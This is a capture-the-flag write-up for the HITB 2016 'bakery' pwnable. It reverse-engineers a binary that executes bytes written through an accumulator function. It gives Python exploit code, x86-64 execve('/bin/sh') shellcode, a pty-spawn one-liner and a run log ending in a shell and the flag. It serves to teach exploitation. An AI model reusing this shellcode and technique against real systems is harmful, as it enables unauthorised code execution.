date: 2016-04-01 00:00:00
modified: 2016-04-01 00:00:00
title: HITB 2016 - Bakery write-up
author: hugsy
tags: pwn,hitb
category: ctf

I participated to [HITB Teaser CTF](https://ctftime.org/event/325/) only to have a bit of
fun with there pwnable challenge(s) which I find usually fun and
instructive. The teaser only offered one pwnable challenge, named `bakery`.


### Info ###


```bash
gef➤  !file ./bakery.910abf341053d25831ecb465b7ddf738
./bakery.910abf341053d25831ecb465b7ddf738: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=74fa32ca74594550d59ff5fb64b8dd523965cdfc, stripped
gef➤  checksec ./bakery.910abf341053d25831ecb465b7ddf738
[+] checksec for './bakery.910abf341053d25831ecb465b7ddf738'
Canary:                                           Yes
NX Support:                                       Yes
PIE Support:                                      No
RPATH:                                            No
RUNPATH:                                          No
Partial RelRO:                                    Yes
Full RelRO:                                       No
```

It is a baking program, that allows to build your own recipe.


### Vulnerability ###

After printing the available ingredients, the `main` function does this (at
0x0400CBC)
![image_alt](https://i.imgur.com/yrFucNx.png)

Which translates to the pseudo-code:
```c
buf = mmap(NULL, 0x1000, RWX, flags, ...);
memset(buf, '\xc3', 0x1000);
srand( time(NULL) );
randint = rand() * 0x1337;
printf("0v3n w4rm3d up to %d d3greez! (d4mn h0t!)\n", randint);
```

Then it enters a loop to add the ingredients:
```c
printf("Add ingredient");
fgets(ingredient, 127, stdin);
ingredient[ strlen(ingredient)-1 ] = '\x00';
strncmp(ingredient, "BAKE", 4);
```

If we enter `BAKE`, it will simply jump to the buffer allocated by `mmap` from
above:
```asm
.text:0000000000400EB8                 mov     rax, [rbp+mmap_buf]
.text:0000000000400EBF                 mov     [rbp+var_108], rax
.text:0000000000400EC6                 mov     rdx, [rbp+mmap_buf]
.text:0000000000400ECD                 mov     rax, [rbp+var_108]
.text:0000000000400ED4                 mov     rdi, rdx
.text:0000000000400ED7                 call    rax
```

Otherwise, it will check using `strstr()` if our ingredient we entered is in the
list of valid ingredients. If the sub-string was found, it calls a function at
0x400B15 with 2 arguments, the string we provided as input for ingredient, and
the random integer generated initially.

The function at 0x400B15 is fairly simply and could be translate to pseudo-code
like this:
```c
int func_400B15(char* input, int init)
{
  int accu;
  int i;
  accu = init;
  for( i=0; i<strlen(input); i++ ) accu += input[i];
  return accu;
}
```

The result is then `and`-ed to 0xff and written at current location in the mmap
allocated buffer
```asm
.text:0000000000400E77                 mov     rax, [rbp+p_mmap_buf]
.text:0000000000400E7E                 movzx   edx, [rbp+result]
.text:0000000000400E85                 mov     [rax], dl
.text:0000000000400E87                 add     [rbp+p_mmap_buf], 1
```
The pointer to the `mmap` buffer is incremented.


So what this program is doing, is using the "accumulator" function to write
inside the `mmap` buffer, which will then be jumped into and executed.


### Exploitation ###

Getting the initial random integer can be done by reading from the socket until
receiving the string `0v3n w4rm3d up to` and divide this value by 0x1337.
```python
    # get the init rand()
    parts = s.read_until("\n").split()
    temp = int(parts[5])
    ok("Got temp=%d" % temp)
    rand = temp / 0x1337
    ok("Got rand=%d" % rand)
```

To reliably control the content of the `mmap`-ed buffer, we need to "compensate"
the accumulation that the function is doing. Since we know the initial random
integer, my approach was to use one of the valid ingredients (in this case
`FLOUR`) which is required to pass the `strstr()` check, sum up the ascii values
of the letters of the word, and add the random init.
```python
def write_char_in_memory(sock, char, init):
    sock.read_until("add ingredient> ")
    [...]
    base = init + sum( [ord(x) for x in 'FLOUR'] )
```

If the value does not finish by a NULL, I calculate what is the closest upper
bound to be aligned with 0, and substract the result with my value:
```python
def find_closest_upper_bound(x):
    a = x >> 8
    a+= 1
    return a << 8

[...]
    top = base
    if base & 0xff != 0x00:
        top = find_closest_upper_bound(base)
    diff = top-base
```

This gives me in the `diff` variable what needs to be added to the stub `randint
+ 'F' + 'L' + 'O' + 'U' + 'R'`. We can then padding this stub by appending to
this stuff `diff` times `\x01`. This way we fully control the last byte, so we
can append the character we actually want written in memory.


Now that we can write reliably one character at a time, we can copy our
shellcode:
```python
        sc = "\x48\x31\xd2"                                  # xor rdx, rdx
        sc+= "\x48\x31\xc0"                                  # xor rax, rax
        sc+= "\x48\x31\xf6"                                  # xor rsi, rsi
        sc+= "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov rbx, 0x68732f6e69622f2f
        sc+= "\x48\xc1\xeb\x08"                              # shr rbx, 0x8
        sc+= "\x53"                                          # push rbx
        sc+= "\x48\x89\xe7"                                  # mov rdi, rsp
        sc+= "\xc6\xc0\x3b"                                  # mov al, 59
        sc+= "\x0f\x05"                                      # syscall

        for c in sc:
            write_char_in_memory(s, c, rand & 0xff)
```

And to execute it, the only thing left is to start baking!
```python
        s.read_until("add ingredient> ")
        s.write("BAKE" + '\n' )
```

Let's go:
```bash
$  py gef-exploit.py
[+] Connected to 52.17.31.229:31337
Attach with GDB and hit Enter
[+] Got banner
[+] Got temp=654227
[+] Got rand=133
[*] Writing char=H rand=133
[*] Using top=768, base=525
[*] Sending ''FLOURAAA\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01H''
[*] Writing char=1 rand=133
[*] Using top=768, base=525
[...]
[+] Got it, interacting (Ctrl-C to break)
[+] Get a PTY with ' python -c "import pty;pty.spawn('/bin/bash')"  '
python -c "import pty;pty.spawn('/bin/bash')"
bakery@ip-172-31-31-97:/$ cd home/bakery
cd home/bakery
bakery@ip-172-31-31-97:/home/bakery$ ls
ls
YOU_WANT_THIS_ONE  bakery
bakery@ip-172-31-31-97:/home/bakery$ cat YOU_WANT_THIS_ONE
cat YOU_WANT_THIS_ONE
You win! The flag is HITB{24d467d954cc08efbfa6acd8341e55d7}
bakery@ip-172-31-31-97:/home/bakery$
```

Fun challenge, thanks to the whole HITB crew for their continuous creativity. And as usual, the full exploit can be found [here](https://gist.github.com/hugsy/06ff00997c9d07099f27).
